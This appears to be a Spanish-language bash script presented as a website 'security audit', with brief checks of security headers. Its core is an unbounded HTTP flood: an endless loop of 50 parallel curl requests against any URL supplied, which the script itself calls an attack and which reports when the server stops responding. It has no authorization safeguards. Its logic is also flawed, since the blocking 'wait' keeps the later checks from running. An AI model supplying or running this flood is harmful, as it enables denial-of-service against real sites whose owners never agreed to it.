#!/bin/bash

TARGET_URL=$1

if [ -z "$TARGET_URL" ]; then
    echo "Error: Debes proporcionar una URL. Uso: ./scripts/security_audit.sh https://tuweb.com"
    exit 1
fi

echo "#################################################"
echo "#          SANTRIX SECURITY AUDIT REPORT        #"
echo "#################################################"
echo "Target: $TARGET_URL"
echo "Fecha: $(date)"
echo "-------------------------------------------------"

# 1. Prueba de estrés real (Inundación Continua)
echo "[+] Iniciando inundación continua..."
echo "[!] ADVERTENCIA: Esta prueba se ejecutará HASTA QUE LA DETENGAS."
echo "[!] Presiona Ctrl+C en la terminal para detener el ataque."

# Inundación infinita usando un bucle while
while true; do
    seq 100 | xargs -n 1 -P 50 curl -s -o /dev/null -w "%{http_code}\n" "$TARGET_URL" >> /tmp/stress_results.txt
    
    # Análisis rápido de salud del servidor
    FAIL_COUNT=$(tail -n 100 /tmp/stress_results.txt | grep -c -v "200")
    if [ "$FAIL_COUNT" -gt 80 ]; then
        echo "[!] ALERTA CRÍTICA: El servidor ha dejado de responder (DoS detectado)."
    fi
done &
STRESS_PID=$!

echo "[*] Ataque continuo iniciado (PID: $STRESS_PID)."
echo "[*] Monitorizando... Para detenerlo usa el comando: kill $STRESS_PID"
wait $STRESS_PID


# 2. Análisis de fallos comunes
echo "-------------------------------------------------"
echo "[+] ANALIZANDO VULNERABILIDADES:"

# Verificar si el servidor responde
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL")

if [ "$HTTP_STATUS" -eq 200 ]; then
    echo "[!] RESULTADO: El servidor NO bloqueó el ataque simulado."
    echo "[!] FALLO DETECTADO: Falta de Rate Limiting o WAF activo."
    echo "[i] RECOMENDACIÓN: Implementar Cloudflare o configurar mod_evasive/fail2ban."
else
    echo "[✓] RESULTADO: El servidor respondió con estado $HTTP_STATUS o no respondió."
    echo "[✓] ÉXITO: El servidor parece tener mecanismos de protección activos."
fi

# 3. Verificación de Cabeceras de Seguridad
echo "-------------------------------------------------"
echo "[+] REVISIÓN DE CABECERAS:"
HEADERS=$(curl -sI "$TARGET_URL")

if echo "$HEADERS" | grep -q "Strict-Transport-Security"; then
    echo "[✓] HSTS: Protegido"
else
    echo "[X] HSTS: Faltante (Riesgo de Man-in-the-Middle)"
fi

if echo "$HEADERS" | grep -q "X-Frame-Options"; then
    echo "[✓] Clickjacking: Protegido"
else
    echo "[X] X-Frame-Options: Faltante (Riesgo de Clickjacking)"
fi

echo "-------------------------------------------------"
echo "#           FIN DEL REPORTE SANTRIX             #"
echo "#################################################"
